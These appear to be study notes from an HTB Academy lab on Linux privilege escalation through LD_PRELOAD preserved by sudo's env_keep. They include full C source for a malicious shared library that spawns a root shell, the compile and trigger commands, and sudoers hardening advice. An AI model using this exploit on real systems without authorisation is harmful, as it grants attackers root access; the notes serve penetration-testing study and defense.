# Linux Privilege Escalation — Shared Libraries (LD_PRELOAD)

**Module:** HTB Academy (Linux Privilege Escalation track)

---

## Shared Libraries Background

- Libraries hold compiled code/data reused across programs, avoiding duplicate code.
- Two types:
  - **Static libraries** (`.a`) — compiled directly **into** the program; cannot be altered afterward.
  - **Dynamic/shared object libraries** (`.so`) — loaded at runtime; **can be modified/replaced** to influence a program's execution.

### How the System Finds Dynamic Libraries

- `-rpath` / `-rpath-link` compiler flags.
- Environment variables: **`LD_RUN_PATH`**, **`LD_LIBRARY_PATH`**.
- Default directories: `/lib`, `/usr/lib`.
- Additional paths listed in **`/etc/ld.so.conf`**.
- **`LD_PRELOAD`** — loads a specified library **before** any others, giving its functions **preference** over the defaults — this is the key privesc vector.

### Viewing a Binary's Required Libraries

```bash
ldd /bin/ls
```
```
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1
libc.so.6       => /lib/x86_64-linux-gnu/libc.so.6
...
```

## LD_PRELOAD Privilege Escalation

### Prerequisite: Check Sudo Rights

```bash
sudo -l
```

```
Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=..., env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

**Key details:**
- User can run `/usr/sbin/apache2 restart` as root, **no password**.
- Not a listed **GTFOBin**, and the sudoers entry uses an **absolute path** — so normally this specific command couldn't be abused directly.
- **However:** `env_keep+=LD_PRELOAD` means sudo **preserves the `LD_PRELOAD` environment variable** when running the command as root — this is the exploitable misconfiguration.

### Step 1 — Write a Malicious Shared Library

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

- `_init()` runs automatically when the library is loaded.
- Unsets `LD_PRELOAD` (cleanup), sets real/effective UID/GID to 0, then spawns a root bash shell.

### Step 2 — Compile the Library

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

### Step 3 — Trigger via the Allowed Sudo Command

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

- Sudo preserves `LD_PRELOAD` (per the `env_keep` setting) → the malicious library is loaded **before** apache2 runs → `_init()` fires with **root privileges** (since the command runs via sudo) → drops into a root shell.

### Result

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

## Key Takeaways

- Always check **`sudo -l`** output carefully for `env_keep` entries — `LD_PRELOAD` (and similarly, `LD_LIBRARY_PATH`) being preserved across a sudo call is a direct privilege escalation path, **even when the allowed command isn't a known GTFOBin and uses an absolute path**.
- The exploit doesn't depend on the specific command being run (`apache2 restart` here) — it depends on the **environment variable being preserved** when sudo executes it as root.
- General technique: write a tiny shared library with an `_init()` constructor that resets privileges/env and spawns a shell, compile with `gcc -fPIC -shared ... -nostartfiles`, then load it via `LD_PRELOAD` on any sudo-permitted command.
- Defense: avoid `env_keep` for `LD_PRELOAD`/`LD_LIBRARY_PATH` in sudoers; use `env_reset` without exceptions where possible; prefer explicit `Cmnd_Alias` restrictions and `SETENV`/`NOSETENV` tags carefully.
